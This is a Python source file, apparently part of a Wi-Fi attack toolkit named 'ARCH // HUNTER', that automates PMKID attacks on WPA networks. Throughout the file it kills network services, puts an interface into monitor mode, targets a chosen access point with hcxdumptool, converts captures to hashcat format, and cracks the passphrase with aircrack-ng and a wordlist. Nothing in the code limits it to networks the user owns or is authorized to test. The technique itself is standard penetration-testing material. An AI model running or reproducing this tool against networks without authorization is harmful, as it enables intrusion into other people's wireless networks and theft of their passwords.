"""
PMKID Capture Module for ARCH // HUNTER
Uses hcxdumptool for PMKID capture and hcxpcapngtool for hash conversion.
Linux (Kali) only - requires hcxdumptool, hcxpcapngtool, monitor mode support.
"""
import subprocess
import threading
import time
import os
import re
import shutil
from datetime import datetime
from backend.platform_wifi import IS_LINUX, find_tool


CAPTURE_DIR = os.path.join(os.path.dirname(__file__), "captures")
TMP_CAPTURE = "/tmp/pmkid_capture.pcapng"
TMP_BPF = "/tmp/pmkid_target.bpf"
TMP_HASHES = "/tmp/pmkid_hashes.22000"
TMP_AIRCRACK_CAP = "/tmp/pmkid_aircrack.cap"


class PMKIDManager:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.running = False
        self.starting = False
        self.target_bssid = None
        self.target_ssid = None
        self.target_channel = None
        self.capture_proc = None
        self.results = []
        self._output_lines = []
        self._reader_thread = None
        self._timeout_thread = None
        self._start_time = None
        # Crack state
        self.cracking = False
        self.crack_proc = None
        self.crack_result = None

    def start(self, bssid, ssid, channel, timeout=60):
        """Start PMKID capture against a target AP."""
        if not IS_LINUX:
            return {"status": "error", "message": "PMKID capture only works on Linux (Kali)"}

        if self.running:
            return {"status": "error", "message": "PMKID capture already running"}

        # Check required tools
        for tool in ["hcxdumptool", "hcxpcapngtool"]:
            path = find_tool(tool)
            if not path or not os.path.exists(path):
                return {"status": "error", "message": f"Required tool not found: {tool}. Install with: apt install hcxdumptool hcxtools"}

        self.target_bssid = bssid
        self.target_ssid = ssid
        self.target_channel = channel
        self.starting = True

        try:
            # Step 1: Kill interfering processes
            print("[PMKID] Step 1: Killing interfering processes...")
            subprocess.run(["airmon-ng", "check", "kill"],
                           capture_output=True, text=True, timeout=10)
            time.sleep(1)

            # Step 2: Setup monitor mode
            print(f"[PMKID] Step 2: Setting up monitor mode on {self.interface}...")
            self._setup_monitor_mode()

            # Step 3: Create BPF filter for target BSSID
            print(f"[PMKID] Step 3: Creating BPF filter for {bssid}...")
            self._create_bpf_filter()

            # Step 4: Clean old capture files
            for f in [TMP_CAPTURE, TMP_HASHES]:
                try:
                    os.remove(f)
                except FileNotFoundError:
                    pass

            # Step 5: Start hcxdumptool
            print("[PMKID] Step 4: Starting hcxdumptool...")
            self._start_capture()

            # Step 6: Start timeout thread
            self._start_time = time.time()
            self._start_timeout(timeout)

            self.running = True
            self.starting = False
            print(f"[PMKID] Capture started - BSSID: {bssid}, SSID: {ssid}, Timeout: {timeout}s")
            return {"status": "success", "message": f"PMKID capture started for {ssid}"}

        except Exception as e:
            print(f"[PMKID] Start failed: {e}")
            self.starting = False
            self.stop()
            return {"status": "error", "message": str(e)}

    def stop(self):
        """Stop PMKID capture and convert results."""
        print("[PMKID] Stopping capture...")
        was_running = self.running
        self.running = False

        # Kill hcxdumptool
        if self.capture_proc:
            try:
                self.capture_proc.terminate()
                self.capture_proc.wait(timeout=5)
            except Exception:
                try:
                    self.capture_proc.kill()
                except Exception:
                    pass
            self.capture_proc = None

        # Kill any leftover hcxdumptool processes
        subprocess.run(["pkill", "-f", "hcxdumptool"],
                       capture_output=True)

        # Convert capture to .22000 format
        if was_running and os.path.exists(TMP_CAPTURE):
            print("[PMKID] Converting capture to .22000 format...")
            self._convert_to_22000()

        # Restore interface
        self._restore_interface()

        # Cleanup temp files
        for f in [TMP_BPF]:
            try:
                os.remove(f)
            except Exception:
                pass

        self._start_time = None
        print("[PMKID] Capture stopped, cleanup done.")
        return {"status": "success", "message": "PMKID capture stopped"}

    def get_status(self):
        """Get current capture status."""
        elapsed = 0
        if self._start_time and self.running:
            elapsed = int(time.time() - self._start_time)

        return {
            "running": self.running,
            "starting": self.starting,
            "cracking": self.cracking,
            "target_bssid": self.target_bssid,
            "target_ssid": self.target_ssid,
            "target_channel": self.target_channel,
            "elapsed_seconds": elapsed,
            "pmkid_count": len(self.results),
            "output_lines": self._output_lines[-5:] if self._output_lines else []
        }

    def get_results(self):
        """Return captured PMKID results."""
        return self.results

    # --- Private methods ---

    def _setup_monitor_mode(self):
        """Put interface into monitor mode."""
        # Down
        r1 = subprocess.run(["ip", "link", "set", self.interface, "down"],
                            capture_output=True, text=True, timeout=5)
        # Set monitor
        r2 = subprocess.run(["iw", "dev", self.interface, "set", "type", "monitor"],
                            capture_output=True, text=True, timeout=5)
        # Up
        r3 = subprocess.run(["ip", "link", "set", self.interface, "up"],
                            capture_output=True, text=True, timeout=5)

        print(f"[PMKID] Monitor mode setup: down={r1.returncode} monitor={r2.returncode} up={r3.returncode}")

        if r2.returncode != 0:
            print(f"[PMKID] Monitor mode stderr: {r2.stderr}")
            raise RuntimeError(f"Failed to set monitor mode: {r2.stderr}")
        # Channel is set by hcxdumptool via -c flag, no need to set here

    def _create_bpf_filter(self):
        """Create Berkeley Packet Filter for targeting specific AP.
        hcxdumptool v7.0.0+ uses BPF instead of --filterlist_ap."""
        bssid = self.target_bssid.lower()
        # tcpdump -i <iface> wlan addr3 <BSSID> or wlan addr3 ff:ff:ff:ff:ff:ff -ddd > filter.bpf
        cmd = [
            "tcpdump", "-i", self.interface,
            "wlan", "addr3", bssid,
            "or", "wlan", "addr3", "ff:ff:ff:ff:ff:ff",
            "-ddd"
        ]
        print(f"[PMKID] Creating BPF filter for {bssid}...")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode != 0:
            print(f"[PMKID] tcpdump BPF failed: {result.stderr}")
            raise RuntimeError(f"Failed to create BPF filter: {result.stderr}")

        with open(TMP_BPF, "w") as f:
            f.write(result.stdout)
        print(f"[PMKID] BPF filter written to {TMP_BPF}")

    def _start_capture(self):
        """Start hcxdumptool process with PIPE + reader thread."""
        hcxdumptool = find_tool("hcxdumptool")
        self._output_lines = []

        # hcxdumptool v7.0.0+: -w (not -o), --rds (not --enable_status)
        # Channel format requires band suffix: a=2.4GHz, b=5GHz
        channel_str = str(self.target_channel)
        if self.target_channel and self.target_channel > 14:
            channel_str = f"{self.target_channel}b"
        else:
            channel_str = f"{self.target_channel}a"

        cmd = [
            hcxdumptool,
            "-i", self.interface,
            "-w", TMP_CAPTURE,
            "-c", channel_str,
            "--bpf", TMP_BPF,
            "--rds", "3"
        ]

        print(f"[PMKID] Command: {' '.join(cmd)}")

        self.capture_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )

        def _read_output():
            for line in iter(self.capture_proc.stdout.readline, b''):
                text = line.decode(errors="replace").rstrip()
                if text:
                    self._output_lines.append(text)
                    print(f"[HCXDUMPTOOL] {text}")
                    # Check for PMKID found indicators
                    if "PMKID" in text.upper() or "pmkid" in text:
                        print(f"[PMKID] ** PMKID indicator detected: {text}")
            try:
                self.capture_proc.stdout.close()
            except Exception:
                pass

        self._reader_thread = threading.Thread(target=_read_output, daemon=True)
        self._reader_thread.start()

        # Wait a moment to check if process started
        time.sleep(2)
        if self.capture_proc.poll() is not None:
            log = "\n".join(self._output_lines[-10:])
            raise RuntimeError(f"hcxdumptool failed (exit={self.capture_proc.returncode}): {log}")

        print("[PMKID] hcxdumptool started successfully")

    def _start_timeout(self, timeout):
        """Start timeout thread that stops capture after N seconds."""
        def _timeout_worker():
            deadline = time.time() + timeout
            while self.running and time.time() < deadline:
                time.sleep(1)
            if self.running:
                print(f"[PMKID] Timeout reached ({timeout}s), stopping capture...")
                self.stop()

        self._timeout_thread = threading.Thread(target=_timeout_worker, daemon=True)
        self._timeout_thread.start()

    def _convert_to_22000(self):
        """Convert pcapng capture to .22000 hashcat format."""
        hcxpcapngtool = find_tool("hcxpcapngtool")
        if not hcxpcapngtool:
            print("[PMKID] hcxpcapngtool not found, skipping conversion")
            return

        try:
            # Remove old hash file
            try:
                os.remove(TMP_HASHES)
            except FileNotFoundError:
                pass

            cmd = [hcxpcapngtool, TMP_CAPTURE, "-o", TMP_HASHES]
            print(f"[PMKID] Running: {' '.join(cmd)}")

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            print(f"[PMKID] hcxpcapngtool output: {result.stdout}")
            if result.stderr:
                print(f"[PMKID] hcxpcapngtool stderr: {result.stderr}")

            # Parse .22000 file for PMKID hashes
            if os.path.exists(TMP_HASHES):
                with open(TMP_HASHES, "r") as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        # .22000 format: WPA*TYPE*PMKID*MAC_AP*MAC_STA*ESSID*...
                        parts = line.split("*")
                        hash_type = parts[1] if len(parts) > 1 else "?"
                        pmkid_hash = parts[2] if len(parts) > 2 else ""
                        ap_mac = parts[3] if len(parts) > 3 else ""
                        essid_hex = parts[5] if len(parts) > 5 else ""

                        # Decode ESSID from hex
                        try:
                            essid = bytes.fromhex(essid_hex).decode(errors="replace")
                        except Exception:
                            essid = self.target_ssid or "Unknown"

                        # Format AP MAC with colons
                        if len(ap_mac) == 12:
                            ap_mac_fmt = ":".join(ap_mac[i:i+2] for i in range(0, 12, 2))
                        else:
                            ap_mac_fmt = ap_mac

                        entry = {
                            "bssid": ap_mac_fmt,
                            "ssid": essid,
                            "hash": pmkid_hash[:32] + "..." if len(pmkid_hash) > 32 else pmkid_hash,
                            "full_hash_line": line,
                            "hash_type": "PMKID" if hash_type == "01" else "EAPOL" if hash_type == "02" else hash_type,
                            "time": datetime.now().strftime("%H:%M:%S"),
                        }

                        # Avoid duplicates
                        if not any(r["full_hash_line"] == line for r in self.results):
                            self.results.append(entry)
                            print(f"[PMKID] Hash captured: {essid} ({ap_mac_fmt})")

                # Copy capture + hash files to captures dir
                os.makedirs(CAPTURE_DIR, exist_ok=True)
                sanitized = self.target_bssid.replace(":", "-") if self.target_bssid else "unknown"

                # Copy pcapng
                dst_pcapng = os.path.join(CAPTURE_DIR, f"pmkid_{sanitized}.pcapng")
                shutil.copy2(TMP_CAPTURE, dst_pcapng)

                # Copy .22000
                dst_hash = os.path.join(CAPTURE_DIR, f"pmkid_{sanitized}.22000")
                shutil.copy2(TMP_HASHES, dst_hash)

                # Also copy as .pcap for cracker compatibility
                dst_pcap = os.path.join(CAPTURE_DIR, f"pmkid_{sanitized}.pcap")
                shutil.copy2(TMP_CAPTURE, dst_pcap)

                print(f"[PMKID] Files saved: {dst_pcapng}, {dst_hash}, {dst_pcap}")
                print(f"[PMKID] Total PMKID results: {len(self.results)}")
            else:
                print("[PMKID] No .22000 file generated — no PMKID captured")

        except Exception as e:
            print(f"[PMKID] Conversion failed: {e}")

    def _restore_interface(self):
        """Restore interface to managed mode and restart NetworkManager + wpa_supplicant."""
        try:
            subprocess.run(["ip", "addr", "flush", "dev", self.interface],
                           capture_output=True, timeout=5)
            subprocess.run(["ip", "link", "set", self.interface, "down"],
                           capture_output=True, timeout=5)
            subprocess.run(["iw", "dev", self.interface, "set", "type", "managed"],
                           capture_output=True, timeout=5)
            subprocess.run(["ip", "link", "set", self.interface, "up"],
                           capture_output=True, timeout=5)
        except Exception:
            pass

        # Restart wpa_supplicant (killed by airmon-ng check kill)
        subprocess.run(["systemctl", "restart", "wpa_supplicant"],
                       capture_output=True, timeout=10)
        # Restart NetworkManager
        subprocess.run(["systemctl", "restart", "NetworkManager"],
                       capture_output=True, timeout=10)
        import time
        time.sleep(3)
        # Wait until nmcli can see wifi devices (up to 15 seconds)
        for _ in range(5):
            r = subprocess.run(["nmcli", "dev", "wifi", "rescan"],
                               capture_output=True, timeout=10)
            if r.returncode == 0:
                time.sleep(3)
                break
            time.sleep(2)
        print("[PMKID] Interface restored to managed mode")

    # --- Crack methods ---

    def _get_aircrack_path(self):
        """Find aircrack-ng binary."""
        for path in ["/usr/local/bin/aircrack-ng", "/usr/bin/aircrack-ng"]:
            if os.path.exists(path):
                return path
        return shutil.which("aircrack-ng") or "aircrack-ng"

    def _convert_for_aircrack(self, hash_file_22000):
        """Convert .22000 file to aircrack-ng compatible cap format using hcxhash2cap."""
        hcxhash2cap = find_tool("hcxhash2cap")
        if not hcxhash2cap:
            raise RuntimeError("hcxhash2cap not found. Install with: apt install hcxtools")

        # Clean old file
        try:
            os.remove(TMP_AIRCRACK_CAP)
        except FileNotFoundError:
            pass

        cmd = [hcxhash2cap, f"--pmkid-eapol={hash_file_22000}", "-c", TMP_AIRCRACK_CAP]
        print(f"[PMKID] Converting for aircrack: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        print(f"[PMKID] hcxhash2cap output: {result.stdout.strip()}")

        if not os.path.exists(TMP_AIRCRACK_CAP):
            raise RuntimeError(f"hcxhash2cap failed to create cap file: {result.stderr}")

        return TMP_AIRCRACK_CAP

    def crack(self, bssid, ssid, wordlist, callback=None):
        """Crack PMKID hash using aircrack-ng with a wordlist."""
        if self.cracking:
            return {"status": "error", "msg": "Already cracking"}

        self.cracking = True
        self.crack_result = None

        def strip_ansi(text):
            return re.sub(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])', '', text)

        try:
            # Find .22000 hash file
            sanitized = bssid.replace(":", "-")
            hash_file = os.path.join(CAPTURE_DIR, f"pmkid_{sanitized}.22000")

            if not os.path.exists(hash_file):
                if callback:
                    callback(f"ERROR: Hash file not found: {hash_file}")
                self.cracking = False
                return {"status": "error", "msg": "Hash file not found"}

            if not os.path.exists(wordlist):
                if callback:
                    callback(f"ERROR: Wordlist not found: {wordlist}")
                self.cracking = False
                return {"status": "error", "msg": "Wordlist not found"}

            # Convert .22000 to aircrack-ng compatible cap
            if callback:
                callback("Converting hash to aircrack-ng format...")
            cap_file = self._convert_for_aircrack(hash_file)
            if callback:
                callback("Conversion complete, starting aircrack-ng...")

            # Run aircrack-ng
            aircrack_bin = self._get_aircrack_path()
            cmd = [aircrack_bin, "-w", wordlist, "-e", ssid, cap_file]
            if callback:
                callback(f"CMD: {' '.join(cmd)}")

            self.crack_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )

            key_found = False
            found_key = None

            for line in iter(self.crack_proc.stdout.readline, ''):
                if not line:
                    break
                clean_line = strip_ansi(line).strip()
                if clean_line and callback:
                    callback(clean_line)
                if "KEY FOUND!" in clean_line:
                    match = re.search(r'KEY FOUND!\s*\[\s*(.*?)\s*\]', clean_line)
                    if match:
                        found_key = match.group(1)
                        key_found = True

            self.crack_proc.wait()
            self.crack_proc = None

            if key_found:
                self.crack_result = {"status": "success", "key": found_key}
                return self.crack_result
            else:
                self.crack_result = {"status": "failed", "msg": "Password not found"}
                return self.crack_result

        except Exception as e:
            if callback:
                callback(f"ERROR: {e}")
            self.crack_result = {"status": "error", "msg": str(e)}
            return self.crack_result
        finally:
            self.cracking = False
            self.crack_proc = None

    def stop_crack(self):
        """Stop an active cracking process."""
        if self.crack_proc:
            try:
                self.crack_proc.terminate()
                self.crack_proc.wait(timeout=3)
            except Exception:
                try:
                    self.crack_proc.kill()
                except Exception:
                    pass
            self.crack_proc = None
        self.cracking = False
        return True
